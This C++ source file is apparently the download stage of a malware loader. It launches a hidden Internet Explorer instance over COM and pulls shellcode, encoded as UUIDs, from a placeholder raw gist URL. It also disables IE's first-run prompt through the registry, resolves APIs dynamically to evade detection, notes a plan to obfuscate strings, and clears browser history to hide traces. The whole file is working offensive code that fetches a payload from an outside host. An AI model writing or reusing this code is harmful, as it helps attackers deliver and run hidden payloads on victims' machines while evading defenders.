
#include "headers.h"
#include <objbase.h>


#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")


// Manually adding CUrlHistory GUID
const IID CLSID_CUrlHistory = { 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE };



typedef HRESULT(WINAPI* _CLSIDFromProgID)(
	 LPCOLESTR lpszProgID,
	 LPCLSID lpclsid
);

typedef HRESULT(WINAPI* _CoCreateInstance)(
	REFCLSID rclsid, LPUNKNOWN pUnkOuter,
	DWORD dwClsContext, 
	REFIID riid, 
	LPVOID FAR* ppv);



typedef LSTATUS(WINAPI* _RegCreateKeyExA)(
	HKEY                        hKey,
	LPCSTR                      lpSubKey,
	DWORD                       Reserved,
	LPSTR                       lpClass,
	DWORD                       dwOptions,
	REGSAM                      samDesired,
	const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PHKEY                       phkResult,
	LPDWORD                     lpdwDisposition
	);

typedef LSTATUS(WINAPI* _RegSetValueExA)(
	HKEY       hKey,
	LPCSTR     lpValueName,
	DWORD      Reserved,
	DWORD      dwType,
	const BYTE* lpData,
	DWORD      cbData
	);

typedef LSTATUS(WINAPI* _RegCloseKey)(
	HKEY hKey
	);



int history_cleanup() {

	// Delete IE browser history
	IUrlHistoryStg2* pIEHistory;
	HMODULE OLE = LoadLibraryA("ole32.dll");

	_CoCreateInstance CoCreateInst = (_CoCreateInstance)GetProcAddress(OLE, "CoCreateInstance");
	if (CoCreateInst == NULL)
	{
		printf("Failed\n");
		return 0;
	}


	HRESULT hr = CoCreateInst(CLSID_CUrlHistory, NULL, CLSCTX_INPROC, IID_PPV_ARGS(&pIEHistory));

	if (SUCCEEDED(hr)) {
		pIEHistory->ClearHistory();
		pIEHistory->Release();
	}


	return 0;
}



// BSTR to Char conversion function:
char* BSTRtoChar(BSTR String)
{
	int n, i;
	char* FinalChar;

	n = SysStringLen(String); // length of input
	FinalChar = (char*)malloc(n + 1);
	for (i = 0; i < n; i++)
	{
		FinalChar[i] = (char)String[i];
	}
	FinalChar[i] = 0;
	return FinalChar;
}


BOOL disable_ie_prompt() {
	// Dynamically resolve the API function from Advapi32.dll
	HMODULE advapi32 = LoadLibraryA("Advapi32.dll");

	_RegCreateKeyExA RegCreateKeyExA = (_RegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
	if (RegCreateKeyExA == NULL)
		return FALSE;




	_RegSetValueExA RegSetValueExA = (_RegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
	if (RegSetValueExA == NULL)
		return FALSE;

	_RegCloseKey RegCloseKey = (_RegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
	if (RegCloseKey == NULL)
		return FALSE;

	// Disable IE prompt
	DWORD data = 1;
	DWORD dwDisposition;
	HKEY hKey;

	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);

	if (RegSetValueExA(hKey, "DisableFirstRunCustomize", 0, REG_DWORD, reinterpret_cast<BYTE*>(&data), sizeof(data)) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return FALSE;
	}

	RegCloseKey(hKey);

	return TRUE;
}



char * download() {

	// Disable IE First-use prompt 


	disable_ie_prompt();

	// we need clsid since we are doing COM 
	CLSID clsid;

	HMODULE OLE = LoadLibraryA("ole32.dll");
	

	// Initialize COM library
	CoInitialize(NULL);




	// Get clsid from ProgramID
	// Makesure to obfuscate the "internetexplorer.app" string out later


	_CLSIDFromProgID cidfrompid = (_CLSIDFromProgID)GetProcAddress(OLE, "CLSIDFromProgID");

	if (cidfrompid(OLESTR("InternetExplorer.Application"), &clsid) != S_OK) {

		// Handle errors reading COM error handling pattern
		printf("IE COM Initialization Failed\n");
	}
	else {

		printf(" [*] IE COM Initialization Success\n");
	}

	LPOLESTR pszTerminalCLSID = NULL;
	HRESULT hr = StringFromCLSID(clsid, &pszTerminalCLSID);
	//printf("IE CLSID ?:  %ws\n", pszTerminalCLSID);

	// We have a valid ClassID for IE now ?

	// Create instance of IE
	IWebBrowser2* webBrowserPtr;
	LPUNKNOWN pUnknown = NULL;
	VARIANT var;
	VARIANT_BOOL vBusy;
	IDispatch* pDispatch = NULL;
	IHTMLDocument2* pHTML = NULL;
	
	_CoCreateInstance CoCreateInst = (_CoCreateInstance)GetProcAddress(OLE, "CoCreateInstance");
	if (CoCreateInst == NULL)
	{
		printf("Failed\n");
		return 0;
	}



	if (CoCreateInst(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (LPVOID*)&pUnknown) != S_OK) {

		printf("Error\n");
	}


	pUnknown->QueryInterface(IID_IWebBrowser2, (LPVOID*)&webBrowserPtr);
	pUnknown->Release();


	// Replace your github or any raw link of UUIDs below
	 OLECHAR test[] = L"https://gist.githubusercontent.com/xxx/xx/raw/xxx/test.txt";

	 // 2. navigate to URL
	BSTR bstrUrl = SysAllocString(test);
	var.vt = VT_I4; // 4 byte signed int
	var.lVal = 0;

	// Change it to FALSE Later !
	if (webBrowserPtr->put_Visible(VARIANT_FALSE) != S_OK) {
		printf("Failed to put visiblity false\n");
	}

	printf(" [*] Fetching Shellcode using IECOM from: %ws\n", test);

	// Visit the URL!
	webBrowserPtr->Navigate(bstrUrl, &var, &var, &var, &var);
	
	SysFreeString(bstrUrl);


	// Wait to load fully
	do
	{
		Sleep(1);
		webBrowserPtr->get_Busy(&vBusy);
	} while (vBusy);


	// additional sleep
	Sleep(2000);


	// Get the HTML
	HRESULT htmldoc = webBrowserPtr->get_Document(&pDispatch);
	pDispatch->QueryInterface(IID_IHTMLDocument2, (LPVOID*)&pHTML);
	pDispatch->Release();

	// 5. print the <title>
	pHTML->get_title(&bstrUrl);
	// printf("Title: %ws\n", bstrUrl);

	IHTMLElement* lpBodyElm;
	HRESULT hrGetBody = pHTML->get_body(&lpBodyElm);

	// Get IHTMLElement HTML Parent element
	IHTMLElement* lpParentElm;
	HRESULT hrGetParElm = lpBodyElm->get_parentElement(&lpParentElm);

	// Get Inner HTML content as a binary string
	BSTR bstrBody;
	HRESULT hrGetInrHTMl = lpParentElm->get_innerHTML(&bstrBody);

	char* p2str;
	char* body;
	body = BSTRtoChar(bstrBody);

	// printf("Body: %s", body);

	//printf("reached \n");

	// works fine till here
	char s2[] = "<pre>";

	char* p1, * p2, * p3;
	p1 = strstr(body, "<pre>");

	//printf("SS %s\n", p1);

	char out[1024];


	if (p1) {
		p2 = strstr(p1, "</pre>");

	//	printf("\n p1 %s\n", p1);

		//cut off initial bytes
		p1 += 5;

		// cut off last bytes
		p1[strlen(p1) - 1] = '\0';
		p1[strlen(p1) - 2] = '\0';
		p1[strlen(p1) - 3] = '\0';
		p1[strlen(p1) - 4] = '\0';
		p1[strlen(p1) - 2] = '\0';
		p1[strlen(p1) - 1] = '\0';


		// printf("\n p1 modified %s\n", p1);


		//if (p2) sprintf_s(out, "%.*s", int(p2 - p1 - 5), p1 + 5);
		// printf("huh: %s\n\n\n", p1);
	}


	// Delete IE History
	history_cleanup();

	//CleanUp
	SysFreeString(bstrUrl);
	webBrowserPtr->Quit();
	webBrowserPtr->Release();
	pHTML->Release();
	CoUninitialize();


	return p1;
}
